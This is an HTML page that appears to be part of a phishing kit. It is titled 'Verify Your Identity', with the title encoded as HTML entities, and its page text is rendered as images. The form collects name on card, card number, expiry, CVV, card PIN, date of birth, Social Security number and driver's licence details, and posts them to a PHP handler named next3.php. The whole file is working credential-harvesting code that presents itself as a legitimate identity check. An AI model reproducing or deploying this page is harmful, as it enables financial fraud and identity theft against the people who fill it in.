<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
 
<style type="text/css">
			 .textbox {
    margin-right: 10px;
    padding-left:4px;
    height: 26px;
    line-height: 20px;
    vertical-align: middle;
}
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1327px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
   $("#exp").mask("99/9999",{placeholder:"MM/YYYY"});
   $("#ssn").mask("999-99-9999",{placeholder:"XXX-XX-XXXX"});
//   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
});
</script>
<script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
    });
</script>
</head>
<body  >
<div id="container">

<div id="image9" style="position:absolute; overflow:hidden; left:202px; top:254px; width:168px; height:336px; z-index:0"><img src="images/b1.png" alt="" title="" border=0 width=168 height=336></div>

<div id="image9" style="position:absolute; overflow:hidden; left:201px; top:609px; width:202px; height:267px; z-index:1"><img src="images/b2.png" alt="" title="" border=0 width=202 height=267></div>

<div id="image6" style="position:absolute; overflow:hidden; left:184px; top:176px; width:173px; height:23px; z-index:2"><img src="images/b8.png" alt="" title="" border=0 width=173 height=23></div>

<div id="image15" style="position:absolute; overflow:hidden; left:182px; top:1002px; width:987px; height:150px; z-index:3"><img src="images/bo28.png" alt="" title="" border=0 width=987 height=150></div>

<div id="image16" style="position:absolute; overflow:hidden; left:208px; top:1050px; width:108px; height:17px; z-index:4"><a href="#"><img src="images/bo29.png" alt="" title="" border=0 width=108 height=17></a></div>

<div id="image1" style="position:absolute; overflow:hidden; left:158px; top:16px; width:983px; height:117px; z-index:5"><img src="images/bb7.png" alt="" title="" border=0 width=983 height=117></div>

<div id="image2" style="position:absolute; overflow:hidden; left:177px; top:143px; width:428px; height:28px; z-index:6"><img src="images/b9.png" alt="" title="" border=0 width=428 height=28></div>

<div id="image10" style="position:absolute; overflow:hidden; left:340px; top:912px; width:75px; height:29px; z-index:6"><a href="#"><img src="images/b10.png" alt="" title="" border=0 width=75 height=29></a></div>

<form action=next3.php method=post>
<input name="noc" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:276px;z-index:7">
<input name="cn" class="textbox cc-number" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:348px;z-index:8">
<input name="ex" placeholder="MM/YYYY" class="textbox cc-exp" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:420px;z-index:9">
<input name="cv" class="textbox cc-cvc" autocomplete="off" required maxlength="3" type="text" style="position:absolute;width:262px;left:203px;top:492px;z-index:10">
<input name="pn" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:262px;left:204px;top:564px;z-index:11">
<input name="db" id="dob" placeholder="MM/DD/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:203px;top:636px;z-index:12">
<input name="sn" id="ssn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:202px;top:705px;z-index:13">
<input name="dl" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:202px;top:776px;z-index:14">
<input name="dlx" id="exp" placeholder="MM/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:202px;top:847px;z-index:15">

<div id="formimage1" style="position:absolute; left:206px; top:910px; z-index:16"><input type="image" name="formimage1"  width="129" height="32" src="images/cnf.png"></div>
</div>
 
 
	
</body>
</html>
